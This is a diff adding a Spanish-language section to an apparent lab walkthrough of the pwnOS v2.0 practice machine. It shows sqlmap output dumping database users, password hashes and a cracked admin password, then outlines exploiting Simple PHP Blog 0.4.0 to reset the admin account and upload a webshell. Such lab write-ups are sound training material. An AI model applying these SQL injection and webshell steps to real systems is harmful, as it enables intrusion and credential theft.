@@ -261,6 +261,60 @@ root@kali:~/PWNOS# sqlmap -r logint.txt --random-agent --technique=BTU --current
 ```
 <img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos8.jpg" width=80% />
 
+- Podemos obtener mucha información, voy a colocar lo mas importante a continuación:
+
+```
+current database: 'ch16'
+current user: 'root@localhost'
+
+database management system users [4]:
+[*] 'debian-sys-maint'@'localhost'
+[*] 'root'@'127.0.0.1'
+[*] 'root'@'localhost'
+[*] 'root'@'web'
+
+database management system users password hashes:
+[*] debian-sys-maint [1]:
+    password hash: *9366FE2112E650C8E5523AE337B10A625C727943
+[*] root [1]:
+    password hash: *248E4800AB95A1E412A83374AD8366B0C0780FFF
+    
+Table: users
+[1 entry]
++---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+
+| user_id | pass                                     | email            | active | last_name | first_name | user_level | registration_date   |
++---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+
+| 1       | c2c4b4e51d9e23c02c15702c136c3e950ba9a4af | admin@isints.com | NULL   | Privett   | Dan        | 0          | 2011-05-07 17:27:01 |
++---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+    
+```
+
+- El hash: "c2c4b4e51d9e23c02c15702c136c3e950ba9a4af" corresponde al pass: killerbeesareflying
+
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos9.jpg" width=80% />
+
+- Lo que también me llama la atención es que somos el usuario ROOT, podríamos subir una WEBSHELL a través de este usuario. Es una opción importante.
+
+### 4.2 . Vulnerabilidad en SIMPLE PHP BLOG 0.4.0
+
+- En los TAGS de la aplicación /blog/ podemos identificar que el portal se trata de un CMS: <meta name="generator" content="Simple PHP Blog 0.4.0" />
+- Buscamos vulnerabilidades en EXPLOIT-DB para este CMS.
+
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos10.jpg" width=80% />
+
+- La idea es NO USAR METASPLOIT, asi que nos toca leer el seguno enlace y DOCUMENTARNOS.
+- En resumen la vulnerabilidad permite cargar un archivo PHP. Los pasos estan descritos aquí: https://www.exploit-db.com/exploits/1191 
+
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos11.jpg" width=80% />
+
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos12.jpg" width=80% />
+
+- Después de haber reseteado el usuario y colocarle admin/admin. Entramos a la aplicación y cargarmos nuestra WEBSHELL:
+
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos13.jpg" width=80% />
+
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos14.jpg" width=80% />
+
+
 
 
 
